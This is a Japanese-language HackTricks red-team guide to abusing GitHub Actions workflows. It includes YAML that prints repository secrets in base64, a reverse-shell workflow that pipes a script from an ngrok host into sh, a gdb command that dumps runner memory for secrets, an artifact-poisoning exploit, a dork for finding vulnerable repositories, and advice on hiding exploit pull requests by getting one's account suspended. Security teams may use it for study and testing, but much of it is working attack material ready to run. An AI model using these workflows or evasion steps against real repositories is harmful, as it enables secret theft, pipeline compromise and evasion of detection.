# Github Actionsの悪用

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 基本情報

このページには以下が含まれます:

* 攻撃者がGithub Actionにアクセスした場合の**全ての影響の要約**
* Actionにアクセスするための異なる方法:
* Actionを作成するための**権限**を持っている
* **プルリクエスト**関連のトリガーを悪用する
* **その他の外部アクセス**技術を悪用する
* 既に侵害されたリポジトリからの**ピボット**
* 最後に、内部からActionを悪用するための**悪用後の技術**についてのセクション（上記の影響を引き起こす）

## 影響の要約

[**Github Actionsについての基本情報**](../basic-github-information.md#github-actions)についての導入を参照してください。

もし**任意のGithub actions/コードを実行**することができる場合、以下のことが可能になるかもしれません:

* そのリポジトリ/組織から**シークレット**を**盗む**。
* もし注入のみが可能な場合、既にワークフローに存在するものを盗むことができます。
* AWSやGCPなどの他のプラットフォームへのアクセスに**リポジトリの権限**を悪用する。
* **カスタムワーカーでコードを実行**する（カスタムワーカーが使用されている場合）し、そこからピボットを試みる。
* リポジトリの**コードを上書き**する。
* これは`GITHUB_TOKEN`（もしあれば）の権限に依存します。
* **デプロイメント**やその他の**アーティファクト**を侵害する。
* もしコードが何かをデプロイまたは保存している場合、それを変更してさらなるアクセスを得ることができるかもしれません。

## GITHUB\_TOKEN

この"**シークレット**"（`${{ secrets.GITHUB_TOKEN }}`と`${{ github.token }}`から取得）は、管理者がこのオプションを有効にしたときに与えられます:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

このトークンは**Githubアプリケーションが使用する**ものと同じで、同じエンドポイントにアクセスできます: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Githubは、`GITHUB_TOKEN`を使用してリポジトリ間でアクセスを**許可するフロー**をリリースする予定です。これにより、リポジトリが他の内部リポジトリにアクセスできるようになります。[**フロー**](https://github.com/github/roadmap/issues/74)
{% endhint %}

このトークンの可能な**権限**はこちらで確認できます: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

このトークンは**ジョブが完了した後に期限切れ**になることに注意してください。\
これらのトークンは次のように見えます: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

このトークンでできる興味深いこと:

{% tabs %}
{% tab title="PRをマージする" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PRを承認" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR を作成" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
複数の場合において、**Github Actions envsやsecrets内にgithubユーザートークンが見つかる**ことがあります。これらのトークンは、リポジトリや組織に対する権限を増やす可能性があります。
{% endhint %}

<details>

<summary>Github Actionの出力でsecretsをリストする</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
<details>

<summary>シークレットを使ったリバースシェルの取得</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

他のユーザーのリポジトリで与えられたGithubトークンの権限を確認するには、アクションの**ログをチェック**することが可能です：

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## 許可された実行

{% hint style="info" %}
これはGithubアクションを侵害する最も簡単な方法であり、このケースでは**組織内に新しいリポジトリを作成する**アクセス権、または**リポジトリに対する書き込み権限**を持っていることを想定しています。

このシナリオにいる場合は、[アクション内部からのポストエクスプロイテーション技術](./#post-exploitation-techniques-from-inside-an-action)を確認するだけで済みます。
{% endhint %}

### リポジトリ作成からの実行

組織のメンバーが**新しいリポジトリを作成**でき、Githubアクションを実行できる場合、**新しいリポジトリを作成して、組織レベルで設定されているシークレットを盗む**ことができます。

### 新しいブランチからの実行

既にGithubアクションが設定されているリポジトリに**新しいブランチを作成**できる場合、それを**変更**し、コンテンツを**アップロード**して、そのアクションを新しいブランチから**実行**することができます。この方法で、リポジトリと組織レベルのシークレットを**抽出**することができます（ただし、それらがどのように呼ばれているかを知る必要があります）。

変更されたアクションを**手動で**実行するか、**PRが作成されたとき**、または**コードがプッシュされたとき**に実行できます（どれだけ騒がしくしたいかによります）：
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
異なるトリガーが攻撃者に**他のリポジトリのGithubアクションを実行させる**可能性があります。これらのトリガー可能なアクションが不適切に設定されている場合、攻撃者はそれらを侵害することができるかもしれません。
{% endhint %}

### `pull_request`

ワークフロートリガー**`pull_request`**は、プルリクエストが受信されるたびにワークフローを実行しますが、例外があります：デフォルトでは、**初めて** **協力する**場合、いくつかの**メンテナー**がワークフローの**実行**を**承認**する必要があります：

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**初回**の貢献者に対する**デフォルトの制限**であるため、有効なバグ/タイポを**修正して貢献した後**、新しい`pull_request`権限を悪用する**他のPRを送る**ことができます。

**これをテストしましたが、機能しませんでした**： ~~プロジェクトに貢献してアカウントを削除した人の名前でアカウントを作成するという別のオプションもあります。~~
{% endhint %}

さらに、デフォルトでは対象リポジトリへの**書き込み権限**と**シークレットアクセス**を防ぐようになっています。[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)で言及されています：

> `GITHUB_TOKEN`を除き、**シークレットはフォークされたリポジトリからトリガーされたワークフローには渡されません**。**`GITHUB_TOKEN`はフォークされたリポジトリのプルリクエストで読み取り専用の権限を持っています**。

攻撃者はGithubアクションの定義を変更して任意のことを実行し、任意のアクションを追加することができます。しかし、前述の制限のため、シークレットを盗んだりリポジトリを上書きすることはできません。

{% hint style="danger" %}
**はい、攻撃者がPRでトリガーされるgithubアクションを変更した場合、使用されるのは元のリポジトリのものではなく、彼のGithubアクションになります！**
{% endhint %}

攻撃者は実行されるコードも制御しているため、`GITHUB_TOKEN`にシークレットや書き込み権限がなくても、例えば**悪意のあるアーティファクトをアップロードする**ことができます。

### **`pull_request_target`**

ワークフロートリガー**`pull_request_target`**は、対象リポジトリへの**書き込み権限**と**シークレットへのアクセス**を持っています（そして、許可を求めません）。

ワークフロートリガー**`pull_request_target`**は**ベースのコンテキストで実行され**、PRによって与えられたコンテキストではありません（**信頼できないコードを実行しないため**）。`pull_request_target`についての詳細は[**ドキュメントを確認してください**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)。\
さらに、この特定の危険な使用についての詳細は、この[**githubブログ投稿**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)を確認してください。

**実行されるワークフロー**が**ベース**で定義されたものであり、PR内のものではないため、**`pull_request_target`**の使用は**安全**だと思われるかもしれませんが、それが**安全でない場合がいくつかあります**。

そして、このワークフローは**シークレットへのアクセス**を持っています。

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run)トリガーは、`completed`、`requested`、または`in_progress`のときに、別のワークフローからワークフローを実行することを可能にします。

この例では、別の"Run Tests"ワークフローが完了した後に実行されるようにワークフローが設定されています：
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
また、ドキュメントによると：`workflow_run`イベントによって開始されたワークフローは、**前のワークフローがそうでなかったとしても、シークレットと書き込みトークンにアクセスできる**とのことです。

この種のワークフローは、**`pull_request`**または**`pull_request_target`**を通じて外部ユーザーによって**トリガー**される**ワークフロー**に**依存**している場合、攻撃を受ける可能性があります。いくつかの脆弱な例は[**このブログで見つけることができます**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**。**最初の例は、攻撃者のコードをダウンロードする**`workflow_run`**トリガーされたワークフローです：`${{ github.event.pull_request.head.sha }}`\
2番目の例は、**信頼されていない**コードから**アーティファクト**を**`workflow_run`**ワークフローに**渡し**、このアーティファクトの内容を**RCEに対して脆弱**にする方法で使用することです。

### `workflow_call`

TODO

TODO: Check if when executed from a pull\_request the used/downloaded code if the one from the origin or from the forked PR

## Forked Executionの悪用

外部の攻撃者がgithubワークフローを実行させる方法をすべて述べましたが、今度は、悪い設定がされている場合、これらの実行がどのように悪用されるかを見てみましょう：

### 信頼されていないcheckout実行

**`pull_request`**の場合、ワークフローは**PRのコンテキスト**で実行されます（つまり、**悪意のあるPRのコード**を実行しますが）、誰かが最初に**承認する必要があり**、いくつかの[制限](./#pull\_request)を持って実行されます。

**`pull_request_target`または`workflow_run`**を使用するワークフローの場合、**`pull_request_target`または`pull_request`**からトリガーできるワークフローに依存している場合、元のリポジトリのコードが実行されるため、**攻撃者は実行されるコードを制御できません**。

{% hint style="danger" %}
ただし、**アクション**に**明示的なPRチェックアウト**があり、**PRからコードを取得**する場合（ベースからではない）、攻撃者が制御するコードを使用します。例えば（PRコードがダウンロードされる12行目をチェック）：
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. 例としてのみ提供されます。
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

潜在的に**信頼されていないコードは、`npm install`または`npm build`の間に実行されています**。ビルドスクリプトと参照されている**パッケージはPRの著者によって制御されています**。

{% hint style="warning" %}
vulnerable actionsを検索するためのgithub dorkは：`event.pull_request pull_request_target extension:yml`ですが、アクションが不安全に設定されていても、ジョブが安全に実行されるように設定するさまざまな方法があります（PRを生成するアクターに関する条件付けを使用するなど）。
{% endhint %}

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

PRを作成する**ユーザー**によって値が**制御**されている特定の[**githubコンテキスト**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)があることに注意してください。githubアクションがその**データを使用して何かを実行している**場合、**任意のコード実行**につながる可能性があります：

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ドキュメントから：ワークフロージョブの後続のステップで**環境変数を利用可能にする**ためには、環境変数を定義または更新し、これを**`GITHUB_ENV`**環境ファイルに書き込むことができます。

攻撃者がこの**env**変数内に任意の値を**注入**できる場合、**LD\_PRELOAD**や**NODE\_OPTIONS**など、後続のステップでコードを実行する環境変数を注入する可能性があります。

例えば（[**これ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0)と[**これ**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)）、アップロードされたアーティファクトを信頼してその内容を**`GITHUB_ENV`**環境変数に格納するワークフローを想像してください。攻撃者は次のようなものをアップロードしてそれを危険にさらすことができます：

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### 脆弱なサードパーティGithubアクション

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**このブログ投稿**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)で述べられているように、このGithubアクションは異なるワークフローやリポジトリからアーティファクトにアクセスすることを可能にします。

問題は、**`path`**パラメータが設定されていない場合、アーティファクトは現在のディレクトリに抽出され、後で使用または実行されるファイルを上書きする可能性があることです。したがって、アーティファクトが脆弱である場合、攻撃者はアーティファクトを信頼する他のワークフローを危険にさらすことができます。

脆弱なワークフローの例：
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
このワークフローを使って攻撃することができます：
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## その他の外部アクセス

### 削除された名前空間リポジトリのハイジャック

アカウントが名前を変更すると、しばらくすると別のユーザーがその名前でアカウントを登録できるようになります。リポジトリが**名前の変更前に100スター未満だった場合**、Githubは同じ名前で**同じ名前のリポジトリ**を作成する新しい登録ユーザーを許可します。

{% hint style="danger" %}
したがって、アクションが存在しないアカウントのリポジトリを使用している場合、攻撃者がそのアカウントを作成し、アクションを危険にさらす可能性があります。
{% endhint %}

他のリポジトリが**このユーザーのリポジトリからの依存関係**を使用している場合、攻撃者はそれらをハイジャックすることができます。より完全な説明はこちらです: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## リポジトリのピボット

{% hint style="info" %}
このセクションでは、最初のリポジトリに何らかのアクセスがあると仮定して（前のセクションを確認してください）、**一つのリポジトリから別のリポジトリにピボットする**技術について話します。
{% endhint %}

### キャッシュポイズニング

**同じブランチ内のワークフロー実行間でキャッシュが維持**されます。つまり、攻撃者が**パッケージを侵害**し、その後キャッシュに保存され、**より権限の高い**ワークフローによって**ダウンロード**され実行される場合、そのワークフローも侵害することができます。

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### アーティファクトポイズニング

ワークフローは**他のワークフローやリポジトリのアーティファクトを使用する**ことがあります。攻撃者が**アーティファクトをアップロードするGithubアクションを侵害**し、後で別のワークフローで使用される場合、**他のワークフローを侵害**することができます：

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## アクションからのポストエクスプロイト

### OIDC経由でAWSとGCPにアクセスする

以下のページを確認してください：

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### シークレットへのアクセス <a href="#accessing-secrets" id="accessing-secrets"></a>

スクリプトに内容を注入する場合、シークレットにアクセスする方法を知っておくと便利です：

* シークレットやトークンが**環境変数**に設定されている場合、環境を通じて**`printenv`**を使用して直接アクセスできます。

<details>

<summary>Githubアクションの出力でシークレットをリストする</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>秘密を使ってリバースシェルを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* シークレットが**直接式に使用される**場合、生成されたシェルスクリプトは**ディスク上に保存され**、アクセス可能です。
* ```bash
cat /home/runner/work/_temp/*
```
* JavaScriptアクションでは、シークレットは環境変数を通じて送信されます
* ```bash
ps axe | grep node
```
*   **カスタムアクション**の場合、プログラムが**引数**から取得したシークレットをどのように使用しているかによって、リスクは異なる場合があります：

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### セルフホストランナーの悪用

**Github Actionsが非Githubインフラストラクチャで実行されている**ことを見つける方法は、Github Actionの設定yamlで**`runs-on: self-hosted`**を検索することです。

**セルフホスト**ランナーは、**より機密性の高い情報**、他の**ネットワークシステム**（ネットワーク内の脆弱なエンドポイント？メタデータサービス？）にアクセスできる可能性があります。また、隔離され破壊されていても、**複数のアクションが同時に実行される**ことがあり、悪意のあるアクションが他のアクションのシークレットを**盗む**可能性があります。

セルフホストランナーでは、**_**Runner.Listener**_**プロセスから**シークレットを取得することも可能です。これには、ワークフローの任意のステップでのすべてのシークレットが含まれており、そのメモリをダンプすることで取得できます：

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

詳細については、[**この投稿をご覧ください**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)。

### Github Dockerイメージレジストリ

Githubアクションを作成して、**DockerイメージをGithub内にビルドして保存する**ことが可能です。\
以下の展開可能な例を参照してください：

<details>

<summary>Githubアクション ビルド &#x26; プッシュ Dockerイメージ</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

前のコードで見られたように、Githubレジストリは**`ghcr.io`**でホストされています。

リポジトリに対する読み取り権限を持つユーザーは、個人アクセストークンを使用してDockerイメージをダウンロードできます：
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
```markdown
次に、ユーザーは**Dockerイメージレイヤーに漏洩したシークレットを検索**できます：

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actionsログにおける機密情報

**Github**がアクションログ内の**シークレット値を検出し、表示を避ける**ようにしていても、アクションの実行中に生成された**他の機密データ**は隠されません。例えば、シークレット値で署名されたJWTは、[特に設定されていない限り](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)隠されません。

## 足跡を隠す

([**こちら**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)からのテクニック) まず、Githubで公開されたPRは一般に公開されており、対象のGitHubアカウントにも明確に表示されます。デフォルトでは、**インターネット上からPRを削除することはできません**が、ひねりがあります。**停止された**Githubアカウントについては、そのアカウントの**すべてのPRが自動的に削除**され、インターネットから削除されます。したがって、活動を隠すためには、**GitHubアカウントを停止させるか、アカウントにフラグを立てる**必要があります。これにより、GitHub上の**すべての活動がインターネット上から隠されます**（基本的にはあなたのエクスプロイトPRをすべて削除します）。

GitHubの組織はアカウントをGitHubに報告することに非常に積極的です。問題に「いくつかのもの」を共有するだけで、彼らは12時間以内にあなたのアカウントが停止されることを確実にします :p そして、あなたはそれを持っています、github上であなたのエクスプロイトを見えなくしました。

{% hint style="warning" %}
組織がターゲットにされたことを把握する唯一の方法は、GitHub UIからPRが削除されているため、SIEMからGitHubログをチェックすることです。
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでAWSハッキングを学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>をクリック！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
```
